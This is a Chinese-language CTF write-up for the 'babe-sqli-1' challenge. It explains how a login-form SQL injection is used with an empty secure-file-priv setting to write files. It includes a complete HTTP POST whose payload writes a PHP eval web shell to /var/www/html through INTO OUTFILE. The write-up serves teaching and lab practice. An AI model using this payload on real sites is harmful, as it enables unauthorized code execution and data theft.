# babe-sqli-1 WP

## 题目介绍

本题主要考察的是，过时且少见的，通过SQL命令写入任意文件的攻击方法。

## 解题思路

首先，在访问主页，是一个登录页面，通过查看HTML可以看到以下内容:

```html
  <!-- Why not see see database? -->
  <!-- and <a href="phpinfo.php">phpinfo?</a> -->
```

按上述提示，访问`phpinfo.php`，确定网页根目录为Debian/Ubuntu风格的`/var/www/html`

接着，对主页的登录进行测试(可以用个单引号测试一下，也可以sqlmap扫扫，没啥过滤)，发现存在注入点

为了省事，可以用sqlmap导出数据库，发现在数据库`mylogin`下的数据:


```console
Database: mylogin
Table: users
[5 entries]
+----+-----------------+-----------------------+
| id | email           | password              |
+----+-----------------+-----------------------+
| 1  | test@test.com   | 12345                 |
| 2  | admin@admin.com | admin123              |
| 3  | Seems that      | nothing here!         |
| 4  | no no no!       | See see other tables? |
| 5  | Actually..      | No more here...       |
+----+-----------------+-----------------------+
```


```console
Database: mylogin
Table: flag
[3 entries]
+----+--------------------------+
| id | f1ag                     |
+----+--------------------------+
| 1  | {I'm-just-a-fake-flag:)} |
| 2  | secure-file-priv=""      |
| 3  | flag is somewhere        |
+----+--------------------------+
```


指向性是很明显的，我们应当利用`secure-file-priv=""`达到任意文件写入的目的。如果有兴趣测试一下权限的话，也能测试出来当前用户是`root` :-)

接下来就是，构造个payload，向/var/www/html下写入个shell，就可以任意浏览文件了。

```
POST /login.php HTTP/1.1
Host: 11.22.33.44
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://11.22.33.44
DNT: 1
Connection: close
Referer: http://11.22.33.44/
Upgrade-Insecure-Requests: 1

email=1' UNION SELECT '<?php eval($_POST["test"]);' INTO OUTFILE '/var/www/html/test.php' --+&password=123
```

之后用个shell连接工具，连接上去，可以看到flag位于`/flag/im_your_f1ag`文件中。



